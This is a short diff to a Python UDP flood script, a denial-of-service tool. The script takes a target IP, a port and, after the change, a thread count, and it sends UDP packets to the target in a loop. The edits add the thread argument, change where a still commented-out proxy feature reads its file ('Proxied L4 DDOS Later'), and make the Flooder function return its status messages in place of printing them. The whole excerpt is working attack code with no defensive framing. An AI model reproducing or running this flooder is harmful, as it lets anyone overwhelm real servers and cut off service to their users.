@@ -11,7 +11,7 @@ from concurrent.futures import as_completed
 count = 0
 def Usage():
     print(f"""
-python3 {__file__} ip port
+python3 {__file__} ip port threads
 """)
 
 try:
@@ -23,7 +23,7 @@ except:
 
 # Will implement Proxied L4 DDOS Later
 ''' 
-def Proxies(file = sys.argv[3]):
+def Proxies(file = sys.argv[1]):
     if os.path.exists(file):
         with open(file,"r")as file:
             content = file.read().strip(" ").split("\n")
@@ -50,9 +50,9 @@ def Flooder(**pHu):
         sVar = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         sendByte = sVar.sendto(py, (pHu['host_ip'],pHu['port']))
         count+=1
-        print(f"SEND {count} UDP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}")
+        return f"SEND {count} UDP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
     except:
-        print(f"UDP Flood Failed On {pHu['host_ip']}:{pHu['port']}")
+        return f"UDP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
     finally:
         sVar.close()
     
